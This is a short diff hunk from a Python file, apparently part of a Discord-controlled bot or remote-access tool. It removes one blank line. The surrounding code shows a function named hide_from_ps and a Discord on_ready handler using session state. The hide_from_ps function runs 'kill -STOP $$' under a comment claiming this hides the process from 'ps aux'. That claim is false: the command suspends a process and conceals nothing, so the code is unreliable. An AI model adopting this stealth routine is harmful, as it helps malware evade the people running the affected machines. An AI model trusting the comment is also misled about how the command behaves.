@@ -195,7 +195,6 @@ def hide_from_ps():
       os.system("kill -STOP $$")  # Stop process listing in `ps aux`
 
 
-
 @client.event
 async def on_ready():
     global sessions
